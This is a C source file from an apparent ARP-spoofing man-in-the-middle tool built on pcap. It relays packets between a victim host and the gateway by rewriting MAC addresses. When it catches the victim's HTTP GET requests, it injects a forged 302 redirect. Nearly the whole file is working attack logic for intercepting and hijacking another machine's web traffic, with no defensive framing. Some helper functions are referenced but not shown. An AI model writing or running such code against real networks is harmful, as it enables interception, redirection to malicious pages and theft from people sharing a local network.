#include "arpSpoofing.h"

int checkHttp(const u_char* packet) {
	PETHERNET_HEADER eh;
	PIP_HEADER ih;
	PTCP_HEADER th;
	/* ethernet header */
	eh = (PETHERNET_HEADER)packet;
	/* ip header */
	if (ntohs(eh->etherType) != IPV4)
		return 0;
	ih = (PIP_HEADER)(packet + ETHERNET_HEADER_SIZE);
	/* tcp header */
	if (ntohs(ih->totalLen) <= IP_HEADER_SIZE + TCP_HEADER_SIZE || ih->protocol != IP_PROTOCOL_TCP)
		return 0;
	th = (PTCP_HEADER)(packet + ETHERNET_HEADER_SIZE + IP_HEADER_SIZE);
	/* tcp data */
	char* data = (char*)(packet + TCP_PACKET_SIZE);
	if (memcmp(data, "GET", 3)) 
		return 0;
	return 1;
}

int packetRedirect(pcap_t* handle, struct pcap_pkthdr* pktHeader, const u_char* packet)
{
	PTCP_PACKET tcpPacket;
	int packetSize;
	tcpPacket = (PTCP_PACKET)packet;
	u_short ether_type = ntohs(tcpPacket->ethernet.etherType);
	if (ether_type == IPV4)
	{
		if (checkVictim(&tcpPacket->ethernet))
		{
			if (checkHttp(packet))
			{
				printf("1\n");
				u_char sendPacket[1024] = { 0 };
				packetSize = packet302Redirect(sendPacket, packet);
				pcap_sendpacket(handle, sendPacket, packetSize);
				packetSize = packetForward(sendPacket, packet );
				pcap_sendpacket(handle, sendPacket, packetSize);
			}
			else
			{
				/* send to router */
				memcpy(tcpPacket->ethernet.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
				memcpy(tcpPacket->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
				memcpy((char*)packet, tcpPacket, pktHeader->len);
				if (pcap_sendpacket(handle, packet, pktHeader->len) != 0)
				{
					fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
					return 0;
				}
			}
		}
		else if (checkGateWay(&tcpPacket->ethernet))
		{
			/* send to victim */
			memcpy(tcpPacket->ethernet.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
			memcpy(tcpPacket->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
			memcpy((char *)packet, tcpPacket, pktHeader->len);
			if (pcap_sendpacket(handle, packet, pktHeader->len) != 0)
			{
				fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
				return 0;
			}
		}
		else
			return 0;
	}
	return 0;
}